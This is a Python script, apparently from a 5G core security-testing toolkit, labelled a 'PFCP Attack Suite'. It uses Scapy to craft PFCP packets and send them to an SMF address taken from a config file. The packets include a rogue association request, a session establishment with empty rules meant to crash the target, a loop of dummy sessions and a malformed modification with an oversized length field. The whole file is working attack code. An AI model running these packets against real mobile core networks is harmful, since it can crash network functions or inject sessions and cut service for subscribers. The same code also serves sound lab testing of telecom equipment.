#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.layers.inet import IP, UDP
from scapy.packet import Raw
from scapy.sendrecv import sr1
import struct
import logging
from core.config import TEST_CONFIG, validate_config
 
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def craft_pfcp_association_request(node_id="10.0.0.8"):
    pfcp_header = struct.pack('!BBH', 0x20, 0x05, 0x0010)
    pfcp_header += struct.pack('!Q', 0)
    
    node_id_ie = struct.pack('!HH', 60, 5)
    node_id_ie += struct.pack('!B', 0)
    node_id_bytes = bytes(map(int, node_id.split('.')))
    node_id_ie += node_id_bytes
    
    recovery_time_ie = struct.pack('!HH', 96, 4)
    recovery_time_ie += struct.pack('!I', 0x5f5e100)
    
    payload = pfcp_header + node_id_ie + recovery_time_ie
    return payload

def craft_pfcp_session_establishment(seid, empty_rules=False):
    pfcp_header = struct.pack('!BBH', 0x21, 0x32, 0x0020)
    pfcp_header += struct.pack('!Q', seid)
    pfcp_header += struct.pack('!I', 1)
    
    node_id_ie = struct.pack('!HH', 60, 5)
    node_id_ie += struct.pack('!B', 0)
    node_id_ie += bytes([10, 0, 0, 8])
    
    if empty_rules:
        pdr_ie = struct.pack('!HH', 1, 0)
        far_ie = struct.pack('!HH', 3, 0)
        payload = pfcp_header + node_id_ie + pdr_ie + far_ie
    else:
        create_pdr = struct.pack('!HH', 1, 12)
        create_pdr += struct.pack('!HHH', 56, 2, 1)
        create_pdr += struct.pack('!HHB', 93, 1, 1)
        
        create_far = struct.pack('!HH', 3, 8)
        create_far += struct.pack('!HHI', 108, 4, 1)
        
        payload = pfcp_header + node_id_ie + create_pdr + create_far
    
    return payload

def craft_pfcp_session_modification(seid, malformed=False):
    pfcp_header = struct.pack('!BBH', 0x21, 0x34, 0x0018)
    pfcp_header += struct.pack('!Q', seid)
    pfcp_header += struct.pack('!I', 2)
    
    if malformed:
        update_far = struct.pack('!HH', 10, 0xFFFF)
    else:
        update_far = struct.pack('!HH', 10, 8)
        update_far += struct.pack('!HHI', 108, 4, 2)
    
    payload = pfcp_header + update_far
    return payload

def pfcp_association_attack(smf_ip, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"Attempting PFCP Association with {smf_ip}")
    
    try:
        payload = craft_pfcp_association_request()
        pkt = IP(dst=smf_ip)/UDP(sport=8805, dport=8805)/Raw(load=payload)
        
        resp = sr1(pkt, timeout=2, iface=iface, verbose=0)
        
        if resp and resp.haslayer(Raw):
            resp_data = bytes(resp[Raw])
            if len(resp_data) >= 4:
                msg_type = resp_data[1]
                if msg_type == 0x06:
                    logger.info("✓ PFCP Association Response received")
                    return True
                else:
                    logger.warning(f"Unexpected PFCP response type: {msg_type}")
            return False
        else:
            logger.warning("No PFCP Association Response")
            return False
    except Exception as e:
        logger.error(f"PFCP Association failed: {e}")
        return False

def pfcp_session_crash_test(smf_ip, seid, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"Testing PFCP Session Establishment with empty PDR/FAR (crash test)")
    
    try:
        payload = craft_pfcp_session_establishment(seid, empty_rules=True)
        pkt = IP(dst=smf_ip)/UDP(sport=8805, dport=8805)/Raw(load=payload)
        
        resp = sr1(pkt, timeout=2, iface=iface, verbose=0)
        
        if resp and resp.haslayer(Raw):
            resp_data = bytes(resp[Raw])
            if len(resp_data) >= 4:
                msg_type = resp_data[1]
                logger.info(f"Response received (type: {msg_type}) - SMF handled empty rules")
                return "handled"
        else:
            logger.warning("No response - possible crash or silent drop")
            return "no_response"
    except Exception as e:
        logger.error(f"PFCP crash test failed: {e}")
        return "error"

def pfcp_dummy_session_creation(smf_ip, seid_start, seid_end, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"Creating dummy PFCP sessions from SEID {seid_start} to {seid_end}")
    
    created_sessions = []
    
    for seid in range(seid_start, seid_end):
        try:
            payload = craft_pfcp_session_establishment(seid, empty_rules=False)
            pkt = IP(dst=smf_ip)/UDP(sport=8805, dport=8805)/Raw(load=payload)
            
            resp = sr1(pkt, timeout=0.5, iface=iface, verbose=0)
            
            if resp and resp.haslayer(Raw):
                resp_data = bytes(resp[Raw])
                if len(resp_data) >= 4 and resp_data[1] == 0x33:
                    created_sessions.append(seid)
                    logger.info(f"✓ Created dummy session: SEID {seid}")
        except Exception as e:
            logger.debug(f"Failed SEID {seid}: {e}")
    
    logger.info(f"Created {len(created_sessions)} dummy sessions")
    return created_sessions

def pfcp_modification_attack(smf_ip, seid, malformed=True, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"Sending PFCP Session Modification (malformed={malformed}) to SEID {seid}")
    
    try:
        payload = craft_pfcp_session_modification(seid, malformed=malformed)
        pkt = IP(dst=smf_ip)/UDP(sport=8805, dport=8805)/Raw(load=payload)
        
        resp = sr1(pkt, timeout=2, iface=iface, verbose=0)
        
        if resp and resp.haslayer(Raw):
            resp_data = bytes(resp[Raw])
            if len(resp_data) >= 4:
                msg_type = resp_data[1]
                logger.info(f"Modification response received (type: {msg_type})")
                return True
        else:
            logger.warning("No modification response")
            return False
    except Exception as e:
        logger.error(f"PFCP modification failed: {e}")
        return False

if __name__ == "__main__":
    smf_ip = TEST_CONFIG["smf_ip"]
    
    logger.info("=== PFCP Attack Suite ===\n")
    
    logger.info("Test 1: PFCP Association")
    pfcp_association_attack(smf_ip)
    
    logger.info("\nTest 2: Empty PDR/FAR Crash Test")
    pfcp_session_crash_test(smf_ip, 12345)
    
    logger.info("\nTest 3: Dummy Session Creation")
    pfcp_dummy_session_creation(smf_ip, 1000, 1005)
    
    logger.info("\nTest 4: Malformed Modification")
    pfcp_modification_attack(smf_ip, 12345, malformed=True)

